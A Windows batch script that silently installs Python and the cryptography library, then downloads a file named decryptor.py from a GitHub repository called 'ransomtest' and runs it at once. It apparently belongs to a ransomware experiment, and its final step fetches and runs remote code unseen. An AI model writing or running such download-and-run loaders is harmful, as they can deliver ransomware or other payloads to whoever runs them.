@echo off

:: Check if Python is installed
python --version >nul 2>&1
if %ERRORLEVEL% NEQ 0 (
    echo Python is not installed. Installing Python...

    :: Set Python installer URL and download path
    set PYTHON_URL=https://www.python.org/ftp/python/3.13.0/python-3.13.0-amd64.exe
    set INSTALLER=python-installer.exe

    :: Download the Python installer using PowerShell
    powershell -Command "Invoke-WebRequest -Uri %PYTHON_URL% -OutFile %INSTALLER%"

    :: Install Python silently and add it to PATH
    %INSTALLER% /quiet InstallAllUsers=1 PrependPath=1

    :: Cleanup the installer
    del %INSTALLER%

    echo Python installation completed.
) else (
    echo Python is already installed.
)

REM Check if the cryptography library is already installed
python -c "import cryptography" >nul 2>&1
IF NOT ERRORLEVEL 1 (
    echo Cryptography library is already installed.
) ELSE (
    echo Installing the cryptography library...
    pip install cryptography
    IF ERRORLEVEL 1 (
        echo Failed to install the cryptography library. Check your internet connection or pip configuration.
        pause
        exit /b
    )
)

:: Download Python script from remote
echo Downloading Python script...
set SCRIPT_URL=https://raw.githubusercontent.com/repel11/ransomtest/refs/heads/main/decryptor.py
set SCRIPT_NAME=script.py

powershell -Command "Invoke-WebRequest -Uri %SCRIPT_URL% -OutFile %SCRIPT_NAME%"

:: Run the downloaded Python script
echo Running the Python script...
python %SCRIPT_NAME%

pause
